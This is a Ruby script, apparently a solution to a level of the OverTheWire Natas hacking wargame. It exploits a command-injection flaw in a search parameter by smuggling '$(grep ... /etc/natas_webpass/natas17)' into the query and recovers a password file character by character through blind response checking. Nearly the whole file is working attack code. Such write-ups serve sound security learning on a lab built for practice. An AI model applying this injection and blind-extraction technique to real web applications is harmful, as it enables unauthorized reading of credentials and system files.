=begin
20 July 2017
This level is the same as the previous one, but we are now exploting a command injection vulnerability.
The black list does not prevent string interpolation with $() so we can brute force the password using
the injection: word$(grep -e ^char /etc/natas_webpass/natas17) where word is any word and char is our character brute force.
By checking that the word does not appear in the response, we can do a character-by-character brute force of the password.
=end

require 'net/http'

host = 'natas16.natas.labs.overthewire.org'
uri = URI("http://#{host}/index.php")
username = 'natas16'

print "Password please: " # Ask user for the password
password = gets.chomp

# Passwords are 32 characters composed of random upper- / lower-case letters and numbers
charset = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'
passNew = ''

puts "Brute force starting."

# Perform a character-by-character brute force using two nested loops
32.times do
  charset.split("").each do |i|
    # Add GET request parameters to the URI
    params = {
      needle: "silently$(grep -e ^#{passNew}#{i} /etc/natas_webpass/natas17)",
      submit: "Search"
    }
    uri.query = URI.encode_www_form(params)

    # Initialize HTTP request object with basic auth
    req = Net::HTTP::Get.new(uri)
    req.basic_auth username, password

    # Get response and check if it contains the keyword
    res = Net::HTTP.start(uri.hostname, uri.port) { |http|
      http.request(req)
    }
    abort("Error: Non-200 response: #{res.code} #{res.message}") unless res.code == "200" # Error handling
    next if res.body.include? "silently"
    # If it does not, then we found a character of the password.
    passNew += i
    print "Brute forcing: #{passNew}\r"
    break
  end
end

print "\033[K"
puts "Done: #{passNew}"
